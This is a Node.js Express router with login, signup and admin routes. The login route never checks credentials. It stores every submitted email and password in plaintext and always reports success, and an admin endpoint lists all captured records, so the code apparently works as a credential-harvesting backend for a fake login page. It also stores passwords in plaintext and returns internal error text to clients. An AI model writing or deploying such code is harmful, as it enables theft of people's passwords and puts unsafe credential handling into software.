const express = require('express');
const User = require('../models/User');

const router = express.Router();
const ADMIN_EMAIL = process.env.ADMIN_EMAIL;
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD;
const ADMIN_TOKEN = process.env.ADMIN_TOKEN;
const hasAdminConfig = Boolean(ADMIN_EMAIL && ADMIN_PASSWORD && ADMIN_TOKEN);

// Save login input only
router.post('/login', async (req, res) => {
  try {
    console.log('Login request received:', { email: req.body.email });
    
    const { email, password } = req.body;
    if (!email || !password) {
      return res.status(400).json({ message: 'Email and password are required' });
    }

    if (hasAdminConfig && email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
      return res.json({
        message: 'Admin login successful',
        success: true,
        isAdmin: true,
        adminToken: ADMIN_TOKEN
      });
    }

    const user = new User({
      type: 'login',
      email,
      password
    });

    const savedUser = await user.save();
    console.log('Login data saved successfully:', savedUser._id);
    
    res.json({
      message: 'Login data saved',
      success: true,
      isAdmin: false
    });
  } catch (err) {
    console.error('Login save error:', err.message);
    console.error('Full error:', err);
    res.status(500).json({ message: 'Server error: ' + err.message });
  }
});

router.get('/admin/users', async (req, res) => {
  try {
    const authHeader = req.headers.authorization || '';
    const token = authHeader.startsWith('Bearer ') ? authHeader.slice(7) : '';

    if (!hasAdminConfig) {
      return res.status(500).json({ message: 'Admin credentials are not configured on server' });
    }

    if (token !== ADMIN_TOKEN) {
      return res.status(401).json({ message: 'Unauthorized admin access' });
    }

    const users = await User.find().sort({ createdAt: -1 }).lean();

    return res.json({
      success: true,
      users
    });
  } catch (err) {
    console.error('Admin users fetch error:', err.message);
    console.error('Full error:', err);
    return res.status(500).json({ message: 'Server error: ' + err.message });
  }
});

// Save signup input only
router.post('/register', async (req, res) => {
  try {
    console.log('Register request received:', { email: req.body.email });
    
    const { email, password } = req.body;
    if (!email || !password) {
      return res.status(400).json({ message: 'Email and password are required' });
    }

    const user = new User({
      type: 'signup',
      email,
      password
    });

    const savedUser = await user.save();
    console.log('Signup data saved successfully:', savedUser._id);

    res.status(201).json({
      message: 'Signup data saved',
      success: true
    });
  } catch (err) {
    console.error('Register save error:', err.message);
    console.error('Full error:', err);
    res.status(500).json({ message: 'Server error: ' + err.message });
  }
});

module.exports = router;
